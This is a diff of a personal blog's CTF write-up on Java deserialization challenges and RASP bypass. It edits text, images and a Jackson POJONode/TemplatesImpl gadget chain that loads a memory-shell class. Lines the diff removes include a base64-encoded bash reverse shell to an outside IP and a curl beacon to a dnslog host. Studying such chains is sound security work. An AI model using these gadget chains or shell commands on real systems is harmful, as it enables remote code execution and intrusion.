@@ -27,7 +27,13 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116173432061.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116175433258.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116180610346.png">
-<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116183004744.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163804262.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163604636.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164032405.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164159748.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164335056.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165021493.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165147196.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234022459.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234040641.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234557231.png">
@@ -45,7 +51,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155007555.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127213739145.png">
 <meta property="article:published_time" content="2023-11-15T13:07:25.000Z">
-<meta property="article:modified_time" content="2023-11-27T15:06:17.645Z">
+<meta property="article:modified_time" content="2023-11-29T08:56:52.045Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116172916127.png">
@@ -253,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          47k 字
+          45k 字
         
       </span>
     
@@ -264,7 +270,7 @@
         
         
         
-          393 分钟
+          378 分钟
         
       </span>
     
@@ -532,9 +538,7 @@ public <span class="hljs-keyword">class</span> test &#123;
 <p>序列化的时候执行<code>ArrayTable.writeArrayTable(s, arrayTable);</code>导致我们写不进两个key相同value不同的ArrayTable</p>
 <p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116180610346.png" srcset="/img/loading.gif" lazyload alt="image-20231116180610346"></p>
 <p>这里就需要我们重写<code>writeArrayTable</code>方法</p>
-<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116183004744.png" srcset="/img/loading.gif" lazyload alt="image-20231116183004744"></p>
-<p>这是重写的方法，对着改写类名就行</p>
-<p>按照图示本地生成，复制粘贴类的内容，然后在本地的文件中重写方法</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163804262.png" srcset="/img/loading.gif" lazyload alt="image-20231129163804262"></p>
 <div class="code-wrapper"><pre><code class="hljs reasonml">package org.example;
 
 import com.fasterxml.jackson.databind.node.POJONode;
@@ -572,30 +576,7 @@ import java.util.HashMap;
 
 public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
     public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
-        <span class="hljs-comment">// byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\InjectToController.class&quot;));</span>
-        <span class="hljs-comment">//        String s1 = Base64.getEncoder().encodeToString(bytes);</span>
-        <span class="hljs-comment">//        System.out.println(s1);</span>
-        <span class="hljs-comment">//        String x = &quot;var str=&#x27;&quot;+s1+&quot;&#x27;;var Thread = Java.type(&#x27;java.lang.Thread&#x27;);var tt=Thread.currentThread().getContextClassLoader();var b64 = Java.type(&#x27;sun.misc.BASE64Decoder&#x27;);var b=new b64().decodeBuffer(str);var byteArray = Java.type(&#x27;byte[]&#x27;);var int = Java.type(&#x27;int&#x27;);var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc = defineClassMethod.invoke(tt,b,0,b.length);cc.newInstance();&quot;;</span>
-        <span class="hljs-comment">//        //String x = &quot;java.lang.Runtime.getRuntime().exec(\\\&quot;calc\\\&quot;)&quot;;</span>
-        <span class="hljs-comment">//        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span>
-        <span class="hljs-comment">//        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;pupi1=eval&quot;));</span>
-        <span class="hljs-comment">//        resourceRef.add(new StringRefAddr(&quot;pupi1&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;+ x +&quot;\&quot;)&quot;));</span>
-        <span class="hljs-comment">//        Class&lt;?&gt; ccCl = Class.forName(&quot;javax.naming.spi.ContinuationDirContext&quot;); //$NON-NLS-1$</span>
-        <span class="hljs-comment">//ClassPool pool = ClassPool.getDefault();</span>
-        <span class="hljs-comment">//CtClass ctClass = pool.makeClass(&quot;a&quot;);</span>
-        <span class="hljs-comment">//CtClass superClass = pool.get(AbstractTranslet.class.getName());</span>
-        <span class="hljs-comment">//ctClass.setSuperclass(superClass);</span>
-        <span class="hljs-comment">//CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span>
-        <span class="hljs-comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span>
-        <span class="hljs-comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Y3VybCBodHRwOi8vMG1xMHdxLmRuc2xvZy5jbg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span>
-        <span class="hljs-comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;curl http://0mq0wq.dnslog.cn\&quot;);&quot;);</span>
-        <span class="hljs-comment">//ctClass.addConstructor(constructor);</span>
-        <span class="hljs-comment">//byte[] bytes = ctClass.toBytecode();</span>
-        <span class="hljs-comment">//TemplatesImpl templatesImpl = new TemplatesImpl();</span>
-        <span class="hljs-comment">//setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span>
-        <span class="hljs-comment">//setFieldValue(templatesImpl, &quot;_name&quot;, &quot;boogipop&quot;);</span>
-        <span class="hljs-comment">//setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);</span>
-        <span class="hljs-comment">//byte[] code= Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\evil.class&quot;));</span>
+
         byte<span class="hljs-literal">[]</span> code= <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\InjectToController.class&quot;</span>)</span>);
         byte<span class="hljs-literal">[]</span><span class="hljs-literal">[]</span> codes=&#123;code&#125;;
         TemplatesImpl templatesImpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;
@@ -607,6 +588,7 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
         Field val2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;
         val2.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
         val2.set(exp2,jsonNodes2);
+        
         KeyPairGenerator keyPairGenerator;
         keyPairGenerator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KeyPairGenerator</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;
         keyPairGenerator.initialize(<span class="hljs-number">1024</span>);
@@ -614,6 +596,7 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
         PrivateKey privateKey = keyPair.get<span class="hljs-constructor">Private()</span>;
         Signature signingEngine = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Signature</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;
         SignedObject signedObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SignedObject(<span class="hljs-params">exp2</span>,<span class="hljs-params">privateKey</span>,<span class="hljs-params">signingEngine</span>)</span>;
+        
         POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">signedObject</span>)</span>;
         XString xString = <span class="hljs-keyword">new</span> <span class="hljs-constructor">XString(<span class="hljs-string">&quot;111&quot;</span>)</span>;
         SwingPropertyChangeSupport swingPropertyChangeSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingPropertyChangeSupport(<span class="hljs-string">&quot;11&quot;</span>)</span>;
@@ -845,7 +828,27 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
 &#125;</code></pre></div>
 
 <p>给出Boogipop的exp</p>
-<p>但只有这两个还不行，要重写<code>writeArrayTable</code>，但大佬只有该方法的图，应该还是重写有问题，我是没有打通</p>
+<p>但只有这两个还不行，要重写<code>writeArrayTable</code>，但大佬博客只有该方法的图，应该还是重写有问题，我是没有打通</p>
+<p>哈哈哈哈哈哈，我回来啦</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163604636.png" srcset="/img/loading.gif" lazyload alt="image-20231129163604636"></p>
+<p>因为这里的反射调用的是rt.jar包下的class文件，所以在本地重写类是不行滴，要把jar包里的<code>ArrayTable</code>的class文件替换掉 （真的服了，而且调试的时候本地重写类被当作了源码，出现了牛头不对马嘴的情况）</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164032405.png" srcset="/img/loading.gif" lazyload alt="image-20231129164032405"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164159748.png" srcset="/img/loading.gif" lazyload alt="image-20231129164159748"></p>
+<p>但在题目中使用时会出现这样的报错</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164335056.png" srcset="/img/loading.gif" lazyload alt="image-20231129164335056"></p>
+<p>很明显是jackson链子不稳定问题 ，TemplatesImpl后面加上这部分即可</p>
+<div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);
+Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+cons.setAccessible(<span class="hljs-literal">true</span>);
+<span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();
+advisedSupport.setTarget(templatesImpl);
+<span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);
+<span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);
+
+<span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);</code></pre></div>
+
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165021493.png" srcset="/img/loading.gif" lazyload alt="image-20231129165021493"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165147196.png" srcset="/img/loading.gif" lazyload alt="image-20231129165147196"></p>
 <h1 id="rasp"><a href="#rasp" class="headerlink" title="rasp"></a>rasp</h1><p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP</a></p>
 <p>说了那么多，但其实这两题根本不关他的事，现在就来说说它是什么</p>
 <p>RASP 全称为 <code>Run­time Ap­pli­ca­tion Self-Pro­tec­tion</code>，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p>
@@ -1682,11 +1685,13 @@ res = requests.get(baseUrl + <span class="hljs-string">&quot;/shell?cmd=/readfla
 <p>见证历史性的一刻，嘻嘻，真的看了好久了（快十几天了，断断续续的），终于成功了</p>
 <p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#POC">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/">强大的Boogipop大佬WP</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>唉，nomap还是没做出来，重写方法太难了</p>
-<p>值得一提的是这篇文章的题都是用jackson打的，在写着一篇时终于会利用Jackson了，并且完善了jackson那篇文章</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>值得一提的是这篇文章的题都是用jackson打的，在写这一篇时终于会利用Jackson了，并且完善了jackson那篇文章</p>
 <p>rasp也是多学到了一个知识点</p>
 <p>但是也不是什么都懂了，有关代码具体部分要我写我肯定是写不出来的，只能算多学一个知识点</p>
-<p>这样不行啊，还是得向Boogipop大佬学习尽快学完javaweb、javamvc、servlet等等，不然内存马也学不了一点</p>
+<p>这样不行啊，还是得向Boogipop大佬学习尽快学完javaweb、webmvc、servlet等等，不然内存马也学不了一点</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/">https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/</a></p>
+<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/</a></p>
 
                 
               </div>
